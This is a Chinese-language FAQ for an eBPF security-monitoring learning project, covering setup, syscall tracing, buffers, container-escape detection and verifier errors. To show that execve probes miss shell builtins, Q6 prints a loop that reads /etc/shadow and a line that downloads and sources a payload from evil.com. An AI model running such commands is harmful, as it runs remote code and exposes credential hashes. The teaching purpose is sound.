# ❓ 常见问题 (FAQ)

基于实际学习过程中遇到的问题和解决方案整理而成。

---

## 🚀 环境搭建

### Q1: Ubuntu 虚拟机需要什么配置?

**推荐配置**:
- CPU: 4核心 (2×2)
- 内存: 6-8 GB
- 硬盘: 50-80 GB (动态分配)
- 网络: NAT模式

**最小配置**:
- CPU: 2核心
- 内存: 4 GB
- 硬盘: 40 GB

详见 [`docs/项目环境.md`](./docs/项目环境.md)

---

### Q2: 如何验证 BCC 安装成功?

```bash
sudo python3 -c "from bcc import BPF; print('BCC OK')"
```

应该输出 `BCC OK`，没有报错。

如果报错：
- 检查内核版本: `uname -r` (需要 ≥ 5.15)
- 检查依赖: `dpkg -l | grep bpfcc-tools`
- 重新安装: `sudo apt install bpfcc-tools linux-headers-$(uname -r)`

---

### Q3: Git 克隆 GitHub 仓库失败怎么办?

**现象**: 
```
fatal: unable to access 'https://github.com/xxx': Connection timed out
```

**原因**: 网络连接问题，可能需要代理

**解决方案**:

1. 配置 Git 代理 (假设本地代理端口为 7890):
```bash
git config --global http.proxy http://127.0.0.1:7890
git config --global https.proxy http://127.0.0.1:7890
```

2. 克隆完成后取消代理:
```bash
git config --global --unset http.proxy
git config --global --unset https.proxy
```

3. 或使用便捷脚本:
```bash
# Windows
git-proxy.bat on
git clone xxx
git-proxy.bat off

# Linux/Mac
./git-proxy.sh on
git clone xxx
./git-proxy.sh off
```

---

## 🔬 eBPF 基础

### Q4: 为什么 execve 计数器初始值不是 0?

**现象**: 刚启动程序就看到计数已经是 8 了

**完整分析**:

敲下 `sudo python3 hello-map.py` 后，发生了什么：

```text
1. bash (UID 1000) → fork + execve("sudo")       +1 (UID 1000)
2. sudo (UID 0)     → fork + execve("python3")    +1 (UID 0)
3. python3 启动 → import BPF → 触发 BCC 编译
4. BCC 调用 clang 编译 eBPF C 代码
   - clang 可能 fork + execve 自身的子进程         +N
5. eBPF 程序加载进内核 → attach_kprobe 成功
   │
   └─→ 从此刻开始计数
   
6. sleep(2) → 第一次 print
   │
   └─→ 这 2 秒内又有几个后台 execve               +N
```

**结论**: 
- 计数器是累积的，从程序加载 eBPF 探针的那一刻就开始计数了
- 初始的跳跃主要来自 BCC 编译过程本身产生的 execve
- eBPF 探针挂钩的是**整个系统**的 execve，不只是当前终端

**为什么之后计数涨得这么慢?**

因为 `execve` 本身就是一个**低频系统调用**——只有在**启动新程序**时才会调用。系统里大部分后台进程是长期运行的守护进程，启动完就蹲在那里了，不会再频繁 execve。

---

### Q5: 为什么 COMM 显示的是 bash 而不是 ls?

**现象**: 执行 ls 后，看到 COMM=bash

**完整流程分析**:

当我们在终端里敲下 `ls` 时，实际发生的流程是：

```text
1. bash 进程读取你的输入 "ls"
2. bash 调用 fork()，创建一个子进程（子进程此时依然是 bash）
3. 子进程调用 execve("/bin/ls")
   ↑ 注意！kprobe 就挂在这个 execve 的入口
   此时，这个子进程的 comm 依然是 "bash"！
4. execve 执行成功，子进程的内存镜像被替换成 /bin/ls，comm 变成 "ls"
   ↑ 但 eBPF 探针在步骤 3 就已经触发并返回了，根本没走到这一步
```

所以，我们看到的 `COMM=bash`，意思是 **"是 bash 发起的 execve"**，而不是 "bash 被执行了"。

**解决方案**: 

使用 tracepoint 而不是 kprobe，因为 tracepoint 可以直接访问系统调用参数：

```c
TRACEPOINT_PROBE(syscalls, sys_enter_execve) {
    struct data_t data = {};
    
    // 从 tracepoint 参数中读取 filename
    bpf_probe_read_user_str(&data.filename, sizeof(data.filename), 
                            (void *)args->filename);
    
    events.perf_submit(args, &data, sizeof(data));
    return 0;
}
```

这样就能看到 `CMD=/usr/bin/ls` 而不是只显示 `CALLER=bash`。

---

### Q6: 为什么 exit 命令没有被捕获?

**现象**: 在终端执行 exit，eBPF 程序没有任何输出

**原因**: `exit` 是 bash 的**内建命令（builtin）**，不是外部程序。

```bash
# 验证哪些命令是内建的
type ls
# 输出: ls is /usr/bin/ls          ← 外部命令，有独立可执行文件

type exit
# 输出: exit is a shell builtin    ← 内建命令，bash 自己实现的

type cd
# 输出: cd is a shell builtin      ← 也是内建！

type echo
# 输出: echo is a shell builtin    ← 也是内建！（虽然 /usr/bin/echo 也存在）
```

**输入 ls 时**:
```bash
bash → fork() → 子进程 execve("/usr/bin/ls")  ← 触发了 eBPF 探针
```

**输入 exit 时**:
```bash
bash → 直接调用 exit() 系统调用退出自己  ← 没有 execve，探针无感
```

**安全启示**: 

这说明如果我们需要做到安全，**只监控 `execve` 是不够的！**

攻击者可以完全不触发 `execve`，纯用内建命令完成很多操作：

```bash
# 不触发任何 execve 的恶意操作链：
cd /etc                    # 内建，无 execve
while read line; do        # 内建，无 execve
  echo "$line"             # 内建，无 execve
done < shadow              # 重定向读取敏感文件
```

更危险的是，如果攻击者拿到的是一个**受限 shell**，或者用 `source` 加载恶意脚本：

```bash
# 下载恶意脚本并直接在当前 shell 执行
source <(curl http://evil.com/payload.sh)
# 或者
. /tmp/malicious.sh
```

**全程零 execve，探针什么也看不到。**

这就是为什么要搞多探针的原因：

| 探针类型 | 捕获内容 | 漏掉内容 |
|---------|---------|---------|
| execve | 启动新程序 | shell 内建命令 |
| openat | 打开文件（包括内建命令读取） | 纯内存操作 |
| connect | 发起网络连接 | 已建立连接上的数据传输 |
| mount | 挂载文件系统 | 其他特权操作 |
| ptrace | 进程注入 | 其他注入方式 |

**结论**: 单一探针永远不够，必须组合使用。

---

### Q7: Perf Buffer 和 Ring Buffer 有什么区别?

**Perf Buffer 结构**:
```text
┌──────────┐  ┌──────────┐  ┌──────────┐
│ CPU 0    │  │ CPU 1    │  │ CPU 2    │
│ buffer   │  │ buffer   │  │ buffer   │
└──────────┘  └──────────┘  └──────────┘
    ↑ 各自独立，事件可能乱序
```

**Ring Buffer 结构**:
```text
┌──────────────────────────────────────┐
│  CPU 0  │  CPU 1  │  CPU 2  │  ...  │
│  事件A  │  事件B  │  事件C  │       │
└──────────────────────────────────────┘
     ↑ 全局有序，内存共享，不浪费
```

**完整对比**:

| 维度 | Perf Buffer | Ring Buffer |
|------|-------------|-------------|
| 内核版本要求 | 4.4+ | **5.8+** |
| 缓冲区结构 | 每 CPU 各一个 | **所有 CPU 共享一个** |
| 事件顺序 | 跨 CPU 可能乱序 | **全局有序** |
| 内存效率 | per-CPU 预留，可能浪费 | **按需使用，更节省** |
| 丢事件时的通知 | 无 | **有（可检测数据丢失）** |
| BCC 内核态 API | `perf_submit(ctx, &data, size)` | `ringbuf_output(&data, size, flags)` |
| BCC 用户态 API | `open_perf_buffer` + `perf_buffer_poll` | `open_ring_buffer` + `ring_buffer_poll` |
| 回调参数 | `(cpu, data, size)` | `(ctx, data, size)` |
| 推荐度 | 老内核兼容 | **新项目首选** |

**结论**: 现代内核（≥ 5.8）优先使用 Ring Buffer。

---

### Q8: ringbuf_output 的第三个参数是什么?

```c
events.ringbuf_output(&data, sizeof(data), 0);
//                                      ↑ flags
```

**flags 参数**:
- `0` = 正常提交
- `BPF_RB_FORCE_WAKEUP` = 立即唤醒用户态消费（低延迟场景）

默认情况下，内核会**批量聚合**事件再通知用户态（减少系统调用次数，提高吞吐）。如果你需要最低延迟（比如安全告警场景），可以用 `BPF_RB_FORCE_WAKEUP` 强制立即唤醒。

---

## 🛡️ 安全相关

### Q9: 如何检测容器逃逸?

**核心思路**: 监控危险的系统调用组合

**关键探针**:

1. **procfs 挂载检测**:
```c
// 监控 mount 系统调用
TRACEPOINT_PROBE(syscalls, sys_enter_mount) {
    // 检查 source 是否为 /proc
    // 检查 target 是否为目标容器的根文件系统
}
```

2. **ptrace 附加检测**:
```c
// 监控 ptrace 系统调用
TRACEPOINT_PROBE(syscalls, sys_enter_ptrace) {
    // 检查是否跨容器边界附加
}
```

3. **敏感文件访问检测**:
```c
// 监控 openat 系统调用
TRACEPOINT_PROBE(syscalls, sys_enter_openat) {
    // 检查是否访问 /proc/kcore、/etc/shadow 等
}
```

---

### Q10: eBPF 能实时阻断攻击吗?

**答案**: 可以，但有局限。

**方法**: 修改系统调用的返回值

```c
// 示例：阻止挂载 procfs
TRACEPOINT_PROBE(syscalls, sys_enter_mount) {
    // 检查是否为危险的挂载操作
    if (is_dangerous_mount()) {
        // 返回错误码，阻止操作
        return -EPERM;
    }
    return 0;
}
```

**局限性**:
- ✅ 可以阻断系统调用级别的攻击
- ⚠️ 需要在 LSM (Linux Security Module) 框架下才能实现某些阻断
- ❌ 不能阻断所有类型的攻击（如逻辑漏洞）

---

## 📊 性能相关

### Q11: eBPF 对系统性能有多大影响?

**测试数据** (Ubuntu 22.04, 4核, 8GB):

| 程序类型 | CPU 开销 | 内存占用 | 事件延迟 |
|---------|---------|---------|---------|
| trace_printk | <1% | ~1 MB | <1 ms |
| Perf Buffer | 1-2% | ~2 MB | <1 ms |
| Ring Buffer | 1-2% | ~1 MB | <1 ms |
| Hash Map + 轮询 | 2-3% | ~5 MB | ~2 s |

**结论**:
- eBPF 的性能开销非常小（<5% CPU）
- Ring Buffer 是最优选择（全局有序 + 低开销）
- 避免频繁的 Map 轮询（改用事件驱动）

---

### Q12: 如何优化 eBPF 程序性能?

**最佳实践**:

1. **使用 Ring Buffer 代替 Perf Buffer**
   - 全局有序，内存更高效

2. **减少不必要的数据拷贝**
   ```c
   // ❌ 不要每次都复制大结构体
   bpf_probe_read(&big_struct, sizeof(big_struct), ptr);
   
   // ✅ 只复制需要的字段
   bpf_probe_read(&field1, sizeof(field1), &ptr->field1);
   ```

3. **使用 Per-CPU Map**
   ```c
   // 避免锁竞争
   BPF_PERCPU_ARRAY(cpu_stats, u64, 1);
   ```

4. **避免复杂循环**
   - Verifier 可能拒绝过于复杂的循环
   - 使用有界循环

---

## 🔧 调试相关

### Q13: Verifier 报错怎么办?

**常见错误**:

1. **"invalid access to memory"**:
   ```
   libbpf: failed to load program 'hello'
   libbpf: verifier error: invalid access to memory, size=4
   ```
   
   **原因**: 直接访问用户态指针
   
   **解决**:
   ```c
   // ❌ 错误写法
   const char *filename = args->filename;
   
   // ✅ 正确写法
   bpf_probe_read_user_str(&data.filename, sizeof(data.filename), 
                           (void *)args->filename);
   ```

2. **"R1 type=scalar expected=fp"**:
   
   **原因**: 寄存器类型不匹配
   
   **解决**: 检查指针运算和类型转换

3. **"jump out of range"**:
   
   **原因**: 程序太复杂，超出验证器限制
   
   **解决**: 简化逻辑，拆分为多个小程序

---

## 📚 学习资源

### Q14: 有哪些好的学习资源?

**官方文档**:
- [eBPF.io](https://ebpf.io/) - 官方学习路径
- [BCC Tutorial](https://github.com/iovisor/bcc/blob/master/docs/tutorial.md)
- [libbpf Documentation](https://libbpf.readthedocs.io/)

**书籍**:
- 《Learning eBPF》by Liz Rice (强烈推荐)
- [中文翻译版](https://binw666.github.io/learning-ebpf-translation/)

**博客**:
- [Brendan Gregg's eBPF Tools](http://www.brendangregg.com/bpf.html)
- [Cilium Blog](https://cilium.io/blog/)

**开源项目**:
- [Falco](https://falco.org/) - 云原生运行时安全
- [Tracee](https://github.com/aquasecurity/tracee) - eBPF 安全追踪
- [Cilium](https://cilium.io/) - eBPF 网络与安全

---

## 💡 其他

### Q15: 如何贡献本项目?

欢迎提交 Issue 和 Pull Request!

**提交 Issue**:
- 描述清楚问题和复现步骤
- 附上环境信息（Ubuntu 版本、内核版本等）

**提交 PR**:
1. Fork 本仓库
2. 创建分支 (`git checkout -b feature/xxx`)
3. 提交更改 (`git commit -m 'Add xxx'`)
4. 推送到分支 (`git push origin feature/xxx`)
5. 创建 Pull Request

---

**没有找到你的问题?** 

欢迎提 Issue，我会持续更新这个 FAQ 🚀
